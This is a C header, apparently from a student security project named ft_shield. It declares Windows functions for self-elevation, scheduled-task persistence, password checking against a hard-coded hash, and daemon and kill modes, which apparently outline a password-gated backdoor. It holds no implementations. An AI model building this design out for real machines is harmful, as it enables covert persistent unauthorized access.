/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ft_shield.h                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/10/20 13:30:33 by zcadinot          #+#    #+#             */
/*                                                                            */
/* ************************************************************************** */

#pragma once

#include <winsock2.h>
#include <windows.h>
#include <string.h>
#include <bcrypt.h>
#include "cmd.h"
#include "daemon.h"

#define PASSWORD_SHA256 \
	"0315b4020af3eccab7706679580ac87a710d82970733b8719e70af9b57e7b9e6"

void    debug_printf(const char *format, ...);
int     is_elevated(void);
int     spawn_elevated(void);
char    *get_my_path(void);
int     task_install(const char *path, const char *arg);
int     persistence_task_detect(void);
int     task_uninstall(void);
int     password_check(const char *password);
void    log_write(const char *format, ...);
int     mode_normal(void);
int     mode_kill(void);
